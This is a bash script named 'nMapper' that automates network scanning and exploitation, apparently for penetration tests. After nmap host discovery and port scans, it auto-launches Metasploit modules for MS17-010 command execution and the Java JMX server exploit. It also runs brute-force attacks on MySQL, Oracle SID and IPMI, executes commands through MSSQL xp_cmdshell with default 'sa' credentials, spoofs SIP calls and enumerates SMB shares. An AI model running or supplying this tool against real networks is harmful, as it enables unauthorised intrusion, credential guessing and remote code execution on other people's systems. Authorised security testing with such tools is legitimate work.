#!/usr/bin/bash


echo "$(tput setaf 1)$(tput bold)     
      ::::    :::  :::   :::      :::    ::::::::: ::::::::: ::::::::::::::::::: 
     :+:+:   :+: :+:+: :+:+:   :+: :+:  :+:    :+::+:    :+::+:       :+:    :+: 
    :+:+:+  +:++:+ +:+:+ +:+ +:+   +:+ +:+    +:++:+    +:++:+       +:+    +:+ 
   +#+ +:+ +#++#+  +:+  +#++#++:++#++:+#++:++#+ +#++:++#+ +#++:++#  +#++:++#:    
  +#+  +#+#+#+#+       +#++#+     +#++#+       +#+       +#+       +#+    +#+    
 #+#   #+#+##+#       #+##+#     #+##+#       #+#       #+#       #+#    #+#     
###    #######       ######     ######       ###       #############    ### $(tput sgr 0)";     


echo "$(tput setaf 7)$(tput bold)
            Version    : 1.0
            Author     : Orhan YILDIRIM
            Medium     : @orhan_yildirim
            Linkedin   : www.linkedin.com/in/orhan-yildirim
            License    : MIT License
            Note       : Who's up!

$(tput sgr 0)";

while getopts u:p:d: flag
	do
	    case "${flag}" in
	        u) username=${OPTARG};;
	        p) password=${OPTARG};;
	        d) domain=${OPTARG};;
	    esac
	done

	echo "$(tput setaf 7)$(tput bold)For privileged user you have to specify an account '-u username -p password -d domain'$(tput sgr 0)$domain";
	echo "$(tput setaf 7)$(tput bold)Example Usage: ./nmapper.sh -u <username> -p <password> -d <domain>'$(tput sgr 0)$domain";
	echo "$(tput setaf 2)$(tput bold)[+] Username: $(tput sgr 0)$username";
	echo "$(tput setaf 2)$(tput bold)[+] Password: $(tput sgr 0)$password";
	echo "$(tput setaf 2)$(tput bold)[+] Domain: $(tput sgr 0)$domain";
	echo -en '\n'
#======================================================================================================================

#nMapper Starting
mkdir nMapper-results;
echo "$(tput setaf 4)$(tput bold)[+] nMapper is started...$(tput sgr 0) "
echo "$(tput setaf 4)$(tput bold)[+] Creating 'nMapper-result' Directory...$(tput sgr 0)"

#MSFCONSOLE
nohup msfdb stop 2> stderrfile ;
nohup msfdb start 2> stderrfile ;
nohup msfdb init 2> stderrfile ;
#======================================================================================================================
#nohup 2> stderrfile ;

#HOST DISCOVERY
#Ping Scan
SECONDS=0
echo "$(tput setaf 4)$(tput bold)[+] Host discovery process is started$(tput sgr 0)"
nohup nmap -n -sP -T5 -iL kapsam.txt --min-hostgroup 1000 --min-parallelism 1000 --max-retries 2 --stats-every 30s -oG - | grep "Status: Up" | cut -d " " -f 2 > nMapper-results/raw_up_hosts.txt 2> stderrfile ;
duration=$SECONDS
echo "$(tput setaf 3)$(tput bold)[+] Finished Host Discovery Process! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"
#======================================================================================================================


#FIND PORT 445 
SECONDS=0
echo "$(tput setaf 4)$(tput bold)[+] Started scanning port : 445$(tput sgr 0)"
nmap -iL nMapper-results/raw_up_hosts.txt -n -Pn -p445 --open --stats-every 30s -oG smb;
cat smb | grep "Status: Up" | cut -d " " -f 2 > nMapper-results/445.txt;
rm smb;
duration=$SECONDS
echo "$(tput setaf 2)$(tput bold)[+] Finished scanned port 445! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"

#======================================================================================================================

#MS17-010 Vulnerability
SECONDS=0
echo "$(tput setaf 4)$(tput bold)[+] Started SMB Vulnerability Script$(tput sgr 0)"
nohup nmap -n -Pn -iL nMapper-results/445.txt  --script smb-vuln-ms17-010.nse --stats-every 30s -p445 -oN nMapper-results/ms17-010_vulnerability 2> stderrfile ;
rm nohup*
cat nMapper-results/ms17-010_vulnerability | grep -B 12 '''SMBv1 servers (ms17-010)''' | grep 'for' | awk '{print $5}' > nMapper-results/ms17_010.txt
cat nMapper-results/ms17_010.txt | while read line;do echo "$(tput setaf 7)$(tput setab 1)[!] FOUND MS17-010 VULNERABILITY:  $(tput sgr 0)" ;egrep "Nmap scan report for |State: VULNERABLE|IDs:  CVE:|Remote"| sed 's/Nmap scan report for/xx/'| sed ''/xx/s//$(printf "\033[41m[\!]\033[41m")/'';done ; echo "$(tput setaf 7)$(tput setab 1)[+] SMB VULNERABILITY SCRIPT is done! $(tput sgr 0)";
duration=$SECONDS
echo "$(tput setaf 1)$(tput bold)[+] Finished MS17-010 Vulnerability Script! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"
#======================================================================================================================
#MSFCONSOLE

#msfconsole -q ; workspace -a $domain ; workspace $domain
if cat ./nMapper-results/ms17_010.txt  2> stderrfile | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'  2> stderrfile;
then
	echo "$(tput setaf 4)$(tput bold)[+] Launching MS17-010 Metasploit$(tput sgr 0)"
	mate-terminal -- bash -c '
	touch nMapper-results/ms17_010_command.rc ;
	echo use auxiliary/admin/smb/ms17_010_command > nMapper-results/ms17_010_command.rc  ;
	echo set COMMAND ipconfig >> nMapper-results/ms17_010_command.rc ;
	echo set SMBPASS '$password' >> nMapper-results/ms17_010_command.rc ;
	echo set SMBUSER '$username' >> nMapper-results/ms17_010_command.rc ;
	echo set SMBDOMAIN '$domain' >> nMapper-results/ms17_010_command.rc ;
	echo set RHOSTS file:./nMapper-results/ms17_010.txt >> nMapper-results/ms17_010_command.rc ;
	echo spool nMapper-results/ms17_010_command_executed >> nMapper-results/ms17_010_command.rc ;
	echo exploit -j >> nMapper-results/ms17_010_command.rc ;
	msfconsole -q -r nMapper-results/ms17_010_command.rc '&
	echo "$(tput setaf 4)$(tput bold)[+] Launched MS17-010 Metasploit in another terminal$(tput sgr 0)";
fi
#======================================================================================================================
#MS08-067 Vulnerability
SECONDS=0
echo "$(tput setaf 4)$(tput bold)[+] Started SMB Vulnerability Script$(tput sgr 0)"
nohup nmap -n -Pn -iL nMapper-results/445.txt  --script smb-vuln-ms08-067.nse --stats-every 30s -p445 -oN nMapper-results/ms08-067_vulnerability 2> stderrfile ;
rm nohup*
cat nMapper-results/ms08-067_vulnerability | grep -B 12 '''ms08-067)''' | grep 'for' | awk '{print $5}' > nMapper-results/ms08_067.txt
cat nMapper-results/ms08_067.txt | while read line;do echo "$(tput setaf 7)$(tput setab 1)[!] FOUND MS08-067 VULNERABILITY:  $(tput sgr 0)" ;egrep "Nmap scan report for |State: VULNERABLE|IDs:  CVE:|Remote"| sed 's/Nmap scan report for/xx/'| sed ''/xx/s//$(printf "\033[41m[\!]\033[41m")/'';done ; echo "$(tput setaf 7)$(tput setab 1)[+] SMB VULNERABILITY SCRIPT is done! $(tput sgr 0)";
duration=$SECONDS
echo "$(tput setaf 1)$(tput bold)[+] Finished MS08-067 Vulnerability Script! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"

#======================================================================================================================

#Bluekeep Check 
#Only checks Blukeep not port scanning 3389!
SECONDS=0
echo "$(tput setaf 4)$(tput bold)[+] Checking Bluekeep Vulnerability...$(tput sgr 0)"
nohup nmap -n -Pn -iL nMapper-results/445.txt  --stats-every 30s -p3389 -oG - | grep "Status: Up" | cut -d " " -f 2 > nMapper-results/3389.txt 2> stderrfile ;
rm nohup* 
if cat ./nMapper-results/3389.txt 2> stderrfile | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'  2> stderrfile;
then
	echo "$(tput setaf 4)$(tput bold)[+] Launching Bluekeep Vulnerability Check!$(tput sgr 0)"
	mate-terminal -- bash -c '
	touch ./nMapper-results/bluekeep_check.rc ;
	echo use auxiliary/scanner/rdp/cve_2019_0708_bluekeep > ./nMapper-results/bluekeep_check.rc  ;
	echo set RDP_CLIENT_IP '0.0.0.0' >> ./nMapper-results/bluekeep_check.rc ;
	echo set RHOSTS file:./nMapper-results/3389.txt >> ./nMapper-results/bluekeep_check.rc ;
	echo spool ./nMapper-results/raw_bluekeep >> ./nMapper-results/bluekeep_check.rc ;
	echo run >> ./nMapper-results/bluekeep_check.rc ;
	echo exit -y >> ./nMapper-results/bluekeep_check.rc ;
	msfconsole -q -r ./nMapper-results/bluekeep_check.rc '
	echo "$(tput setaf 4)$(tput bold)[+] Launched Bluekeep Checking Metasploit in another terminal$(tput sgr 0)";
	#cat bluekeep_vulnerable | grep ":3389" ;echo "$(tput setaf 7)$(tput setab 1)[\!] FOUND BLUKEEP VULNERABILITY:  $(tput sgr 0)" ; echo "$(tput setaf 7)$(tput setab 1)[+] BLUEKEEP VULNERABILITY  is done! $(tput sgr 0)";
	cat raw_bluekeep | while read line;do echo "$(tput setaf 7)$(tput setab 1)[!] LISTING BLUEKEEP VULNERABILITY:  $(tput sgr 0)" ;egrep "vulnerable"| sed 's/Nmap scan report for/xx/'| sed ''/xx/s//$(printf "\033[41m[\!]\033[41m")/'';done ; echo "$(tput setaf 7)$(tput setab 1)[+] BLUEKEEP VULNERABILITY scan is done! $(tput sgr 0)";
fi
#======================================================================================================================


#Port Scanning Process
SECONDS=0
echo "$(tput setaf 4)$(tput bold)[+] Started scanning ports....$(tput sgr 0)"
nmap -n -Pn -p21,22,23,25,53,80,111,137,139,443,1099,1433,1521,3306,5060,5432,27017,8080,8081,161,623 --open -iL nMapper-results/raw_up_hosts.txt --min-hostgroup 1000 --min-parallelism 1000 --max-retries 2 -oG nMapper-results/raw_port_scan 2> stderrfile;
cat nMapper-results/raw_port_scan | grep "443/open" | cut -d " " -f 2 > nMapper-results/443.txt;
cat nMapper-results/raw_port_scan | grep "80/open" | cut -d " " -f 2 > nMapper-results/80.txt;
cat nMapper-results/raw_port_scan | grep "21/open" | cut -d " " -f 2 > nMapper-results/21.txt;
cat nMapper-results/raw_port_scan | grep "22/open" | cut -d " " -f 2 > nMapper-results/22.txt;
cat nMapper-results/raw_port_scan | grep "23/open" | cut -d " " -f 2 > nMapper-results/23.txt;
cat nMapper-results/raw_port_scan | grep "25/open" | cut -d " " -f 2 > nMapper-results/25.txt;
cat nMapper-results/raw_port_scan | grep "53/open" | cut -d " " -f 2 > nMapper-results/53.txt;
cat nMapper-results/raw_port_scan | grep "111/open" | cut -d " " -f 2 > nMapper-results/111.txt; 
cat nMapper-results/raw_port_scan | grep "137/open" | cut -d " " -f 2 > nMapper-results/137.txt;
cat nMapper-results/raw_port_scan | grep "139/open" | cut -d " " -f 2 > nMapper-results/139.txt;
cat nMapper-results/raw_port_scan | grep "1099/open" | cut -d " " -f 2 > nMapper-results/1099.txt; 
cat nMapper-results/raw_port_scan | grep "1433/open" | cut -d " " -f 2 > nMapper-results/1433.txt;
cat nMapper-results/raw_port_scan | grep "1521/open" | cut -d " " -f 2 > nMapper-results/1521.txt;
cat nMapper-results/raw_port_scan | grep "3306/open" | cut -d " " -f 2 > nMapper-results/3306.txt;
#cat nMapper-results/raw_port_scan | grep "3389/open" | cut -d " " -f 2 > nMapper-results/3389.txt;
cat nMapper-results/raw_port_scan | grep "5432/open" | cut -d " " -f 2 > nMapper-results/5432.txt;
cat nMapper-results/raw_port_scan | grep "161/open" | cut -d " " -f 2 > nMapper-results/161.txt;
cat nMapper-results/raw_port_scan | grep "623/open" | cut -d " " -f 2 > nMapper-results/623.txt;
cat nMapper-results/raw_port_scan | grep "5060/open" | cut -d " " -f 2 > nMapper-results/5060.txt; 
cat nMapper-results/raw_port_scan | grep "5432/open" | cut -d " " -f 2 > nMapper-results/5432.txt; 
cat nMapper-results/raw_port_scan | grep "27017/open" | cut -d " " -f 2 > nMapper-results/27017.txt;  
duration=$SECONDS
echo "$(tput setaf 4)$(tput bold)[+] Finished port scanning! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"


#======================================================================================================================

#Vulnerability scanning with NSE scripts 
echo "$(tput setaf 6)$(tput bold)[+] Vulnerability scanning is progressing...$(tput sgr 0)"


#======================================================================================================================
#Java JMX Agent Insecure Configuration
#Port 1099
#exploit(multi/misc/java_jmx_server)
if cat ./nMapper-results/1099.txt 2> stderrfile | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}'  2> stderrfile;
then
	echo "$(tput setaf 4)$(tput bold)[+] Launching JMX Agent Insecure Configuration Vulnerability Check!$(tput sgr 0)"
	mate-terminal -- bash -c '
	touch ./nMapper-results/jmx_agent_insecure_check.rc ;
	echo use exploit/multi/misc/java_jmx_server > ./nMapper-results/jmx_agent_insecure_check.rc  ;
	echo set RDP_CLIENT_IP '0.0.0.0' >> ./nMapper-results/bluekeep_check.rc ;
	echo set RHOSTS file:./nMapper-results/1099.txt  >> ./nMapper-results/jmx_agent_insecure_check.rc ;
	echo spool ./nMapper-results/jmx_agent_insecure_check >> ./nMapper-results/jmx_agent_insecure_check.rc ;
	echo run >> ./nMapper-results/jmx_agent_insecure_check.rc ;
	echo exit -y >> ./nMapper-results/jmx_agent_insecure_check.rc ;
	msfconsole -q -r ./nMapper-results/jmx_agent_insecure_check.rc '
	echo "$(tput setaf 4)$(tput bold)[+] Launched JMX Agent Insecure Configuration Metasploit in another terminal$(tput sgr 0)";
	cat jmx_agent_insecure_check | while read line;do echo "$(tput setaf 7)$(tput setab 1)[!] LISTING JMX Agent Insecure Configuratio VULNERABILITY:  $(tput sgr 0)" ;egrep "vulnerable"| sed 's/Nmap scan report for/xx/'| sed ''/xx/s//$(printf "\033[41m[\!]\033[41m")/'';done ; echo "$(tput setaf 7)$(tput setab 1)[+] JMX Agent Insecure Configuratio scan is done! $(tput sgr 0)";
fi
#======================================================================================================================





#SSH Brute Force
#nmap --script ssh-brute --script-args userdb=$1,passdb=$2 -iL nMapper-results/22.txt -oN nMapper-results/ssh-brute;



#DNS Cache Snooping
SECONDS=0
echo "$(tput setaf 6)$(tput bold)[+] DNS Cache Snooping is progressing...$(tput sgr 0)"
nohup nmap --script dns-cache-snoop -p53 -iL nMapper-results/53.txt -oN nMapper-results/dns_cache_snoop 2> stderrfile;
duration=$SECONDS
echo "$(tput setaf 7)$(tput bold)[+] DNS Cache Snooping is done! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"

#NFS Share
SECONDS=0
echo "$(tput setaf 6)$(tput bold)[+] NFS share is progressing...$(tput sgr 0)"
nohup nmap -sV --script=nfs-showmount -iL nMapper-results/111.txt -oN nMapper-results/nfs_share 2> stderrfile;
duration=$SECONDS
echo "$(tput setaf 7)$(tput bold)[+] NFS share is done! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"

#SMB Signing False
SECONDS=0
echo "$(tput setaf 6)$(tput bold)[+] SMB signing is progressing...$(tput sgr 0)"
nohup nmap -n -Pn -iL nMapper-results/445.txt  --script smb-security-mode.nse -p445 -oN nMapper-results/smb_signing_false 2> stderrfile;
duration=$SECONDS
echo "$(tput setaf 7)$(tput bold)[+] SMB signing is done! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"


#Anonymous FTP
SECONDS=0
echo "$(tput setaf 6)$(tput bold)[+] Anonymous FTP is progressing...$(tput sgr 0)"
nmap --script=ftp-anon -p21 -il nMapper-results/21.txt -oN nMapper-results/ftp_anon 2> stderrfile;
duration=$SECONDS
echo "$(tput setaf 7)$(tput bold)[+] Anonymous FTP is done! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"

#SMB SHARE 
SECONDS=0
echo "$(tput setaf 6)$(tput bold)[+] SMB share is progressing...$(tput sgr 0)"
nohup smbmap -u $username -p $password --host-file nMapper-results/445.txt -q > nMapper-results/smb_share;
duration=$SECONDS
echo "$(tput setaf 7)$(tput bold)[+] SMB share is done! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"

#SMTP Open Relay
#nmap --script smtp-open-relay.nse [--script-args smtp-open-relay.domain=$domain,smtp-open-relay.ip=<address>,...] -p 25,465,587 <host>

#MySQL 
SECONDS=0
echo "$(tput setaf 6)$(tput bold)[+] MySQL is progressing...$(tput sgr 0)"
nmap -p3306 --script mysql-brute -iL nMapper-results/3306.txt -oN nMapper-results/mysql_brute 2> stderrfile ;
nmap -sV --script=mysql-empty-password -iL nMapper-results/3306.txt -oN nMapper-results/mysql_empty  2> stderrfile;
duration=$SECONDS
echo "$(tput setaf 7)$(tput bold)[+] MySQL brute force attack is done! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"
echo "$(tput setaf 7)$(tput bold)[+] MySQL empty password attack is done! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"


#ORACLE
SECONDS=0
echo "$(tput setaf 6)$(tput bold)[+] ORACLE sid brute force attack is progressing...$(tput sgr 0)"
nmap --script=oracle-sid-brute -p 1521-1560 -iL nMapper-results/1521.txt -oN nMapper-results/oracle_sid_brute 2> stderrfile ;
duration=$SECONDS
echo "$(tput setaf 7)$(tput bold)[+] ORACLE sid brute force attack is done! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"


 #MSSQL 
SECONDS=0
echo "$(tput setaf 6)$(tput bold)[+] MSSQL defult password attack is progressing...$(tput sgr 0)"
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=sa,mssql.password=sa,ms-sql-xp-cmdshell.cmd="ipconfig" -iL nMapper-results/1433.txt -oN nMapper-results/xp_cmd_shell_command  2> stderrfile;
duration=$SECONDS
echo "$(tput setaf 7)$(tput bold)[+] MSSQL defult password attack is done! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"


#IPMI 
SECONDS=0
echo "$(tput setaf 6)$(tput bold)[+] IPMI attack is progressing...$(tput sgr 0)"
nmap -sU --script ipmi-brute -p 623 -iL nMapper-results/623.txt -oN nMapper-results/ipmi_hosts 2> stderrfile ;
duration=$SECONDS
echo "$(tput setaf 7)$(tput bold)[+] IPMI attack is done! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"


#SIP Spoof
SECONDS=0
echo "$(tput setaf 6)$(tput bold)[+] SIP call spoof is progressing...$(tput sgr 0)"
nmap --script=sip-call-spoof -sU -p 5060 --script-args 'sip-call-spoof.ua=Nmap, sip-call-spoof.from=Boss' -iL nMapper-results/5060.txt -oN nMapper-results/sip_spoof 2> stderrfile ;
duration=$SECONDS
echo "$(tput setaf 7)$(tput bold)[+] SIP call spoof is done! Total Time: $(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"

#======================================================================================================================


echo "$(tput setaf 2)$(tput bold)[+] Finished scanned port 445 :$(($duration / 60)) min. $(($duration % 60)) sec.$(tput sgr 0)"


